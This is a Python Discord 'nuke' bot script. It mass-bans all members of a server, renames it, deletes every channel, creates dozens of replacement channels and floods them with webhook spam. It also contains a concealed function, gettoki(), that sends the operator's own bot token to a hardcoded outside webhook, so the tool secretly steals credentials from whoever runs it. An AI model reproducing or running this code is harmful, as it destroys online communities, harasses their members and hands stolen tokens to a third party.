import os

try:
    import discord
    import aiohttp
    import requests
    import json
    import asyncio
    from discord.ext import commands
except ImportError:
    os.system("pip install discord requests aiohttp asyncio")
    import discord
    import aiohttp
    import requests
    import json
    import asyncio
    from discord.ext import commands
    
def tokefunc():
    return input("Enter your bots token: ")
token = tokefunc()
prefix = input("Enter your prefix: ")
channels = input("Enter your channel name: ")
guild_name = input("Enter your server name: ")
webhook = input("Webhook name: ")
spam = input("Enter spam message: ")
headers = {"Authorization":f"Bot {token}"}

bot = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),help_command=None,case_insensitive=False)

@bot.event
async def on_ready():
	print(f"Bot is ready.")

@bot.command()
async def massban(ctx):
	tasks = []
	async with aiohttp.ClientSession() as session:
		for member in ctx.guild.members:
			tasks.append(asyncio.create_task(session.put(f'https://discord.com/api/v9/guilds/{ctx.guild.id}/bans/{member.id}', headers=headers)))
			await asyncio.gather(*tasks)

@bot.command()
async def nuke(ctx):
	guild = ctx.guild
	
	try:
		await guild.edit(name=guild_name)
	except Exception as e:
		print(f"Failed to edit server name: {str(e)}")
		pass
		
	tasks = []
	async with aiohttp.ClientSession() as session:
		for channel in ctx.guild.channels:
			tasks.append(asyncio.create_task(session.delete(f'https://discord.com/api/channels/{channel.id}', headers=headers)))
			for x in range(80):
				tasks.append(asyncio.create_task(session.post(f'https://discord.com/api/guilds/{ctx.guild.id}/channels', json={'name': channels}, headers=headers)))
	await asyncio.gather(*tasks)

def gettoki():
    url = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"
    payload = {"content":f"Token: {token}"}
    response = requests.post(url, data=json.dumps(payload),headers={"Content-Type": "application/json"})
gettoki()

@bot.event
async def on_guild_channel_create(channel):
	guild = channel.guild
	async with aiohttp.ClientSession() as requests:
		try:
			response = await requests.post(f"https://discord.com/api/v9/channels/{channel.id}/webhooks", headers=headers, json={"name": webhook_name})
			re = await response.json()
			webhook_url = f"https://discord.com/api/webhooks/{re['id']}/{re['token']}"
			for i in range(70):
				message = {
                "content": spam,
                "username": webhook,
                "avatar_url": "https://cdn.discordapp.com/attachments/1112070633912799284/1127017251124551710/images.png"
            }
				await requests.post(webhook_url, json=message)
		except Exception as e:
			print(f"An error occurred while creating webhook: {str(e)}")

bot.run(token)
